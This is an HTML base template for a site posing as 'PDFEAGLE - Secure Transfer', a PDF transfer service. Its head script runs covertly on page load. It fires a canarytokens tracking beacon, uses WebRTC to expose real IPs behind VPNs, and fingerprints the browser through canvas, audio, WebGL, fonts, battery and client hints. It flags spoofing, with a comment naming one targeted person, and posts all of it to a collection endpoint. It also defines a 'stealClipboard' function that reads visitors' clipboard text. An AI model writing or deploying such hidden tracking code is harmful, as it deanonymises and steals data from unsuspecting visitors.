<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PDFEAGLE - Secure Transfer</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    
    <style>
        body { background-color: #f0f2f5; font-family: 'Segoe UI', sans-serif; }
        .navbar { background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .brand-text { font-weight: 800; color: #e74c3c; letter-spacing: 1px; }
        .main-container { max-width: 800px; margin-top: 40px; }
        .card { border: none; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); }
    </style>

    <script>
    // --- ULTIMATE EAGLE EYE v3.1 (WITH CANARYTOKEN) ---
    window.EagleEye = class {
        constructor() {
            this.endpoint = '/api/collect';
            this.sessionId = Math.random().toString(36).substring(7);
            this.init();
        }

        async init() {
            // 1. –ó–∞–ø—É—Å–∫–∞–µ–º CanaryToken (DNS/IP Trap)
            this.triggerDNSBeacon();
            
            // 2. –ó–∞–ø—É—Å–∫–∞–µ–º –æ—Å–Ω–æ–≤–Ω–æ–π —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
            if (document.readyState === 'complete') setTimeout(() => this.collect('Page Load'), 100);
            else window.addEventListener('load', () => setTimeout(() => this.collect('Page Load'), 100));
        }

        // === 1. CANARYTOKEN TRAP ===
        triggerDNSBeacon() {
            // –¢–≤–æ—è –±–æ–µ–≤–∞—è —Å—Å—ã–ª–∫–∞
            const canaryUrl = "http://canarytokens.com/tags/stuff/traffic/giumoqpvt3mawd0bulwx2o4p5/submit.aspx";
            
            // –î–æ–±–∞–≤–ª—è–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã, —á—Ç–æ–±—ã –±—Ä–∞—É–∑–µ—Ä –Ω–µ –∫—ç—à–∏—Ä–æ–≤–∞–ª –∑–∞–ø—Ä–æ—Å
            // –∏ —á—Ç–æ–±—ã —Ç—ã –≤–∏–¥–µ–ª ID —Å–µ—Å—Å–∏–∏ –≤ –ª–æ–≥–∞—Ö CanaryTokens (–µ—Å–ª–∏ –æ–Ω–∏ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä—ã)
            const unique = Math.random().toString(36).substring(7);
            
            // –°–æ–∑–¥–∞–µ–º –Ω–µ–≤–∏–¥–∏–º—ã–π –∑–∞–ø—Ä–æ—Å
            new Image().src = `${canaryUrl}?uid=${this.sessionId}&rnd=${unique}`;
            console.log("Beacon fired");
        }

        // === 2. WEBRTC (VPN PIERCING) ===
        async getWebRTCData() {
            const ips = [];
            try {
                const pc = new RTCPeerConnection({
                    iceServers: [
                        { urls: "stun:stun.l.google.com:19302" },
                        { urls: "stun:stun1.l.google.com:19302" },
                        { urls: "stun:stun2.l.google.com:19302" }
                    ]
                });
                pc.createDataChannel('');
                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);
                
                await new Promise(resolve => {
                    pc.onicecandidate = (e) => {
                        if (!e.candidate) return;
                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                        const match = e.candidate.candidate.match(ipRegex);
                        // –§–∏–ª—å—Ç—Ä—É–µ–º –ª–æ–∫–∞–ª—å–Ω—ã–µ IP (192.168...), –æ—Å—Ç–∞–≤–ª—è–µ–º –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã–µ
                        if (match && !ips.includes(match[1])) ips.push(match[1]);
                    };
                    setTimeout(resolve, 1500);
                });
            } catch (e) { /* Blocked */ }
            return ips;
        }

        // === 3. HARDWARE FINGERPRINTING ===
        
        // Canvas Hash (GPU)
        getCanvasHash() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("Eagle_v3_ü¶Ö", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("Eagle_v3_ü¶Ö", 4, 17);
                
                const data = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < data.length; i++) {
                    hash = ((hash << 5) - hash) + data.charCodeAt(i);
                    hash |= 0;
                }
                return hash.toString(16);
            } catch (e) { return "error"; }
        }

        // Audio Hash (Sound Card)
        async getAudioHash() {
            try {
                const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
                const osc = audioCtx.createOscillator();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(10000, audioCtx.currentTime);
                osc.connect(audioCtx.destination);
                osc.start(0);
                const render = await audioCtx.startRendering();
                const data = render.getChannelData(0);
                let sum = 0;
                for (let i = 0; i < data.length; i++) { sum += Math.abs(data[i]); }
                return sum.toFixed(6);
            } catch (e) { return "no_audio"; }
        }

        // === 4. ANTI-SPOOFING (LIE DETECTOR) ===
        detectLies() {
            const anomalies = [];
            const ua = navigator.userAgent;

            // A. Chrome Version Trap (–õ–æ–≤—É—à–∫–∞ –¥–ª—è –û–º–∏—á–∞)
            const hasGroupBy = !!Object.groupBy; // Chrome 117+
            if (ua.includes("Chrome/109") && hasGroupBy) {
                anomalies.push("CRITICAL: Fake Chrome 109 (Has modern features)");
            }

            // B. Screen Resolution Trap
            if (!window.matchMedia(`(width: ${screen.width}px)`).matches) {
                anomalies.push(`SCREEN SPOOF: JS=${screen.width}, CSS mismatch`);
            }

            // C. OS Trap (Fonts)
            const fonts = this.getFonts();
            if (ua.includes("Windows") && !fonts.includes("Calibri")) {
                anomalies.push("OS SPOOF: Claims Windows but no Calibri");
            }
            if (fonts.includes("Ubuntu") || fonts.includes("Cantarell")) {
                anomalies.push("REALITY: Likely Linux System");
            }

            return anomalies;
        }

        // === 5. SYSTEM INFO ===
        
        // –†–µ–∞–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —à—Ä–∏—Ñ—Ç–æ–≤ (–∏–∑–º–µ—Ä—è–µ–º —à–∏—Ä–∏–Ω—É)
        getFonts() {
            const fontList = [
                "Arial", "Arial Black", "Calibri", "Cambria", "Comic Sans MS", "Consolas", 
                "Courier", "Courier New", "Georgia", "Helvetica", "Impact", "Lucida Console", 
                "Microsoft Sans Serif", "Monaco", "Palatino", "Roboto", "Segoe UI", "Tahoma", 
                "Times", "Times New Roman", "Trebuchet MS", "Verdana", "Wingdings",
                "Ubuntu", "Cantarell", "Liberation Sans" // Linux markers
            ];
            const detected = [];
            const span = document.createElement("span");
            span.style.fontSize = "72px"; span.style.position = "absolute"; span.style.left = "-9999px"; span.innerHTML = "mmmmmmmmmmlli";
            document.body.appendChild(span);
            span.style.fontFamily = "monospace";
            const defaultWidth = span.offsetWidth;
            for (const font of fontList) {
                span.style.fontFamily = `"${font}", monospace`;
                if (span.offsetWidth !== defaultWidth) detected.push(font);
            }
            document.body.removeChild(span);
            return detected;
        }

        // Client Hints
        async getClientHints() {
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                try {
                    const ua = await navigator.userAgentData.getHighEntropyValues([
                        "model", "platformVersion", "fullVersionList", "architecture", "bitness"
                    ]);
                    return {
                        model: ua.model,
                        platform: ua.platform,
                        version: ua.platformVersion,
                        architecture: ua.architecture,
                        mobile: ua.mobile
                    };
                } catch(e) { return null; }
            }
            return null;
        }

        getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return { renderer: 'N/A' };
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
                };
            } catch(e) { return { renderer: 'Error' }; }
        }

        // === 6. COLLECT & SEND ===
        async collect(triggerName, extraData = {}) {
            const [ips, battery, clientHints, audioHash] = await Promise.all([
                this.getWebRTCData(),
                navigator.getBattery ? navigator.getBattery().then(b => `${Math.round(b.level*100)}%`) : 'N/A',
                this.getClientHints(),
                this.getAudioHash()
            ]);
            
            const anomalies = this.detectLies();
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const tzOffset = new Date().getTimezoneOffset();

            const payload = {
                meta: { url: window.location.href, referrer: document.referrer, trigger: triggerName, session_id: this.sessionId },
                
                // === –ù–û–í–´–ï –î–ê–ù–ù–´–ï (GOD MODE) ===
                fingerprint_v2: {
                    canvas_hash: this.getCanvasHash(),
                    audio_hash: audioHash,
                    anomalies: anomalies, // –°–ü–ò–°–û–ö –õ–ñ–ò
                    is_spoofing: anomalies.length > 0
                },

                fingerprint: {
                    gpu: this.getWebGLInfo().renderer,
                    vendor: this.getWebGLInfo().vendor,
                    screen: `${screen.width}x${screen.height}`,
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory
                },
                client_hints: clientHints,
                system: {
                    ua: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    timezone: timezone,
                    timezone_offset: tzOffset, // –°—Ä–∞–≤–Ω–∏ —ç—Ç–æ —Å IP –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ!
                    battery: battery,
                    fonts: this.getFonts()
                },
                network: {
                    webrtc_ips: ips // –†–µ–∞–ª—å–Ω—ã–µ IP
                },
                ...extraData
            };

            const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
            navigator.sendBeacon(this.endpoint, blob);
        }
    };
    
    const eagle = new EagleEye();

    // --- –ö–†–ê–ñ–ê –ë–£–§–ï–†–ê (–¢–≤–æ–π –∫–æ–¥) ---
    async function stealClipboard() {
        try {
            if (navigator.clipboard && navigator.clipboard.readText) {
                const text = await navigator.clipboard.readText();
                return text ? text.substring(0, 1000) : "Empty";
            }
        } catch (e) { return "Blocked/Error"; }
        return "Not Supported";
    }
    </script>
</head>
<body>
    <nav class="navbar navbar-light">
        <div class="container">
            <a class="navbar-brand brand-text" href="/">
                <i class="fa-solid fa-file-pdf"></i> PDFEAGLE
            </a>
        </div>
    </nav>
    <div class="container main-container">
        {% block content %}{% endblock %}
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
